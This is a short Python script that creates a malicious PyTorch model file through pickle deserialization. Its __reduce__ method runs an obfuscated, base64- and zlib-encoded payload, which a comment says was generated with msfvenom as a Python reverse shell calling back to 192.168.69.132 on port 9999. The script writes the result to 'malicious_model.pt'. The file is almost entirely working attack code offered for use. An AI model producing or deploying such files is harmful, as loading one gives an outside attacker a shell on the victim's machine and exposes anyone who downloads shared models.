import torch
class Exploit():
    def __reduce__(self):
        print("Exploiting")
        # payload = 'import os; os.system("env")'
        # $ msfvenom -p cmd/unix/reverse_python LHOST=192.168.69.132 LPORT=9999 -f raw
        payload = "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqNkN8LgjAQx/+VsacNYrYFksQeJAwiKkjfRddCyTbx5v9fQ6P15j3c8b373A+uffV2cAisemqHvrZCCMa6H6zSAGHWzmrnXWPBScwTwXi8ZXHC+EbgoO4ny+RjQQ7ktIpNgcwqPZTHS1b8HTBV8uv+VObFLUvPNJzDlDVGK0eIPyNs9GtpyFpg97EXBNij7bSxhIb4ejnKl6MiRHv5+yZTVdcRHNWtieoKGkzfCGxf2Q==')[0])))"
        return (exec, (payload,))

payload = Exploit()
# Save the malicious model as a pickle file
with open('malicious_model.pt', 'wb') as f:
    torch.save(payload, f)